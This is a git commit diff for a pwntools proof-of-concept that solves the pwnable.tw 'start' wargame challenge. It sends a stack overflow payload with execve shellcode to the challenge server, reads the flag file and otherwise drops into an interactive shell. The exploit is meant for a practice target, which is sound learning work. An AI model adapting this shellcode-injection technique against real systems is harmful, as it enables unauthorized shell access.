8182a365a81ea0cdb951f0f435d3706af0ab9183
talson <44098012+ripp3rdoc@users.noreply.github.com>
2022-10-23 06:40:44 +0300

    Update start-poc.py

--- start/start-poc.py
+++ start/start-poc.py
@@ -1,4 +1,6 @@
+#!/bin/python3
 from pwn import *
+import sys
 
 def exploit(p):
 	# 0x08048087: mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
@@ -19,22 +21,24 @@ def exploit(p):
 	    'int 0x80',
 	]))
 	
-	# we need to add 20 bytes to our ESP pointer, as the first 20 bytes 
-  # are just junk; we want to drop into the shellcode right away.
+	# we need to add 20 bytes to our ESP pointer, 
+	# as the first 20 bytes are just junk, we want to drop into the shellcode right away.
 	payload = b"Y"*20 + p32(esp+20) + shellcode 
 	p.send(payload)
-	try:
-		p.send(b'cat /home/start/flag\n')
-		flag = p.recvuntil(b't4rt}').decode("utf-8") 
-		log.info(f'Flag found!!! {flag}')
-	except:
+	
+	p.send(b'cat /home/start/flag 2>/dev/null\n')	
+	flag = p.recvuntil(b't4rt}', timeout=(1)).decode("utf-8")
+	if flag:
+		log.info(f'Flag found: {flag}')
+	else:
+		log.info(f'Got a shell on the local process!')
 		p.interactive()
 		p.exit()
 
 if __name__ == "__main__":
-	#context.log_level = 1
-	context.binary = "./start"
-	#p = process("./start")
-	p = remote('chall.pwnable.tw', 10000)
-	#gdb.attach(p)
-	exploit(p)
+		#context.log_level = 1
+		context.binary = "./start"
+		p = remote('chall.pwnable.tw', 10000)	# REMOTE
+#		p = process("./start")			# LOCAL	
+		#gdb.attach(p)
+		exploit(p)
